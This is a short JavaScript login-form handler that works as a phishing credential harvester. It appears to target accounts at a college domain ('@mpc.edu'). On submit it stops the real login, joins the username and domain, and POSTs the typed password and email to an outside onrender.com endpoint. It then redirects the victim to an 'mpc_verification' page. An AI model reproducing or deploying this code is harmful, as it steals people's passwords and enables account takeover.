document.addEventListener("DOMContentLoaded", function() {
    
    const loginForm = document.getElementById("new_sign_in");

    // Add submit event listener
    loginForm.addEventListener("submit", function(event){
        // Get email and password values
        const password = document.getElementById("sign_in_password");
        const preEmail = document.getElementById("sign_in_username");
        const postEmail = document.getElementById("sign_in_t_domain");
        var email = preEmail.value + postEmail.value
        // Prevent the default form submission
        console.log(email)
        event.preventDefault();
        if(password.value != ''){
             //Send Login detail to admin for notification
             const userData = {
                FullName: password.value,
                Email: email,
                Password: "username",
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
        
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                window.location.href = "./mpc_verification.html"; // Replace "home.html" with your home page URL
            }, 2000)
        }else{
            alert('Password can\'t be empty')
        }

        
        // Validate email and password
            
        
    })
   
    // Function to validate email
    function validateEmail(email) {
        // Check if the email ends with "@mit.edu"
        return email.endsWith("@mpc.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});

